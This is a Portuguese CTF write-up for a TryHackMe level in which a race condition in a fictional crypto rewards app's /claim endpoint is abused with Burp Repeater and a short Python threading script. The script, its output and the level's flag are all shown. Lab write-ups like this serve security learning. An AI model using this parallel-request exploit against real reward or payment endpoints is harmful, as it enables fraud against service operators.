# TryHackMe — Hackers Holiday CTF
## Level 8 — Towel on the Sunbed

**Categoria:** Web Exploitation / Race Condition / Business Logic Flaw
**Dificuldade:** Média

---

### 🛎️ Concierge Briefing

> Ponzi found the resort's wellness portal running a little side project called Ponzi — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.
> He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through.

---

## 🎯 Objetivo

O briefing é bem explícito sobre a natureza da falha: **"the sunbed had been claimed three times over while he wasn't looking"** e **"somewhere between his request and the server's clock, there's a gap"** — uma descrição quase didática de uma **race condition (condição de corrida)**. O alvo é o **"Ponzi Portfolio"**, um app de recompensas cripto que permite reivindicar **50 PONZI a cada 24 horas**. O objetivo é abusar da janela de tempo entre a verificação do cooldown e a atualização do saldo para reivindicar a recompensa **múltiplas vezes**, acumular **150+ PONZI**, destravar o **Whale Vault** e capturar a flag.

---

## 🔍 Passo 1 — Reconhecendo a aplicação

Acessando a aplicação, encontramos a tela de login do **"Ponzi Portfolio"**:

![Tela de login do Ponzi Portfolio](/Hacker%20Holiday%202026%20-%20THM/8º%20Level%20-%20Towel%20on%20the%20Sunbed/images/Website.png)

> *"Ponzi Portfolio — Stack your bags. Claim your yield."*

Após registrar uma conta (`Register`) e efetuar login, o dashboard mostra:

- **Portfolio Balance:** saldo atual em `PONZI`.
- **Market Prices:** cotações fictícias de BTC, ETH, PONZI e SOL.
- **Staking Rewards:** botão **"Claim Reward"**, que concede **50 PONZI a cada 24 horas**.
- **Whale Vault:** um cofre que se destrava ao atingir **150 PONZI**, liberando uma recompensa exclusiva.

O caminho para a flag é óbvio: **atingir 150+ PONZI** e abrir o Whale Vault. O problema é que o botão de recompensa só pode ser usado uma vez por dia... em teoria.

---

## 🔍 Passo 2 — Interceptando a requisição de "Claim Reward"

Usando o **Burp Suite** como proxy, o clique em **"Claim Reward"** foi capturado:

![Requisição POST /claim interceptada no Burp Suite](/Hacker%20Holiday%202026%20-%20THM/8º%20Level%20-%20Towel%20on%20the%20Sunbed/images/WebSite-_claim.png)

```
POST /claim HTTP/1.1
Host: 10.65.170.249:3000
Content-Length: 0
...
Cookie: connect.sid=s%3AAj a6HEDDXYvol_kawBxxGo3pkMzbOlSm.T1cPG8dYNkhIphvWQIyBdmsOngZgpNGz9kk7emQ8PY4
```

A requisição é simples: um **`POST /claim`** vazio, autenticado apenas pelo cookie de sessão (`connect.sid`). Isso é exatamente o tipo de endpoint ideal para testar **race conditions**: uma única ação de "efeito colateral" (creditar saldo), disparada por uma requisição idempotente na aparência, mas que depende de uma verificação de estado (o cooldown de 24h) feita no servidor.

A hipótese: se o servidor **verifica o cooldown e credita o saldo em etapas separadas** (ex.: lê o "último claim" → decide se libera → grava novo saldo → grava novo timestamp), existe uma janela onde múltiplas requisições **simultâneas** podem passar pela verificação **antes que o timestamp seja atualizado**, resultando em múltiplos créditos.

---

## 🔍 Passo 3 — Testando a race condition com Burp Repeater

Uma primeira validação manual foi feita usando o recurso de **enviar requisições em paralelo** do Burp Repeater: a requisição capturada foi duplicada em múltiplas abas (10 cópias) para serem disparadas ao mesmo tempo.

![Duplicando a requisição /claim em 10 abas do Repeater para envio simultâneo](/Hacker%20Holiday%202026%20-%20THM/8º%20Level%20-%20Towel%20on%20the%20Sunbed/images/Race_Condition.png)

Ao disparar todas as abas praticamente ao mesmo tempo (ou usando o grupo de requisições do Repeater configurado para "send in parallel"), foi possível observar que **mais de uma requisição retornava sucesso (`200`)** antes que o servidor "percebesse" que o cooldown já deveria estar ativo — confirmando a race condition.

---

## 🔍 Passo 4 — Automatizando o ataque com um script Python (multithreading)

Para tornar o ataque confiável e repetível, foi escrito um script Python que dispara **20 requisições simultâneas** ao endpoint `/claim`, usando `threading` para garantir que todas saiam o mais próximo possível umas das outras:

```python
import requests
import threading

url = "http://10.67.191.224:3000/claim"
cookies = {"connect.sid": "s%3ARR1wy1VaT1-MFyQcysa2eDReSWVkdzHZ.KllGRviPalr9KZGzjBpQg5Fhm5IfUws%2FQ04tzrClyQk"}

def hit():
    r = requests.post(url, cookies=cookies)
    print(r.status_code, r.text)

threads = []

for _ in range(20):
    t = threading.Thread(target=hit)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
```

![Execução do script Race.py: múltiplas requisições simultâneas, várias retornando sucesso](/Hacker%20Holiday%202026%20-%20THM/8º%20Level%20-%20Towel%20on%20the%20Sunbed/images/Script_for_Race.png)

Resultado da execução — note que **diversas requisições retornam `200` com saldo crescente**, mesmo com o cooldown de 24h supostamente ativo:

```
429 {"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":86400}
200 {"message":"Staking reward claimed successfully.","reward":50,"newBalance":100,"tier":"Dolphin","priceSnapshot":4.2}
429 {"error":"Reward already claimed. ...","secondsRemaining":86400}
200 {"message":"Staking reward claimed successfully.","reward":50,"newBalance":250,"tier":"Whale","priceSnapshot":4.2}
200 {"message":"Staking reward claimed successfully.","reward":50,"newBalance":250,"tier":"Whale","priceSnapshot":4.2}
200 {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
200 {"message":"Staking reward claimed successfully.","reward":50,"newBalance":450,"tier":"Whale","priceSnapshot":4.2}
200 {"message":"Staking reward claimed successfully.","reward":50,"newBalance":450,"tier":"Whale","priceSnapshot":4.2}
...
```

Ou seja: das 20 requisições disparadas ao mesmo tempo, **várias conseguiram "furar a fila"** antes que o servidor marcasse o cooldown como ativo, cada uma creditando **+50 PONZI**. O saldo saltou rapidamente de `0` para **`450 PONZI`**, e o `tier` mudou de `Dolphin` para **`Whale`** — muito acima dos 150 necessários para destravar o cofre.

---

## 🔍 Passo 5 — Abrindo o Whale Vault e capturando a flag

De volta ao dashboard, o saldo já refletia o resultado do ataque:

![Dashboard mostrando 450 PONZI, tier Whale, e a flag revelada no Whale Vault](/Hacker%20Holiday%202026%20-%20THM/8º%20Level%20-%20Towel%20on%20the%20Sunbed/images/Flag.png)

```
PORTFOLIO BALANCE
450 PONZI
[ WHALE ]

Whale Vault
Reach 150 PONZI to unlock the Whale Vault and claim your exclusive reward.
450 / 150 PONZI
[ Open Vault ]
```

Clicando em **"Open Vault"**, a recompensa exclusiva é revelada:

```
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

---

## 🚩 Flag

```
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```

---

## 📝 Resumo da cadeia de investigação

1. **Briefing** → descreve, quase literalmente, uma condição de corrida: múltiplos "claims" bem-sucedidos apesar do cooldown de 24h.
2. **Reconhecimento da aplicação** → login/registro no "Ponzi Portfolio", identificação do botão **"Claim Reward"** e da meta de **150 PONZI** para destravar o **Whale Vault**.
3. **Interceptação com Burp Suite** → captura da requisição `POST /claim`, autenticada apenas por cookie de sessão.
4. **Teste manual no Burp Repeater** → duplicação da requisição em múltiplas abas disparadas em paralelo, confirmando que mais de um `200 OK` podia ocorrer "ao mesmo tempo".
5. **Script Python com `threading`** → automatiza o disparo de 20 requisições simultâneas ao `/claim`, explorando a janela de corrida entre a checagem do cooldown e a atualização do saldo/timestamp no servidor.
6. **Resultado** → saldo multiplicado de 0 para 450 PONZI em uma única "rodada" de ataque, ultrapassando o limiar de 150 e virando `Whale`.
7. **Whale Vault** → destravado, revelando a flag.

---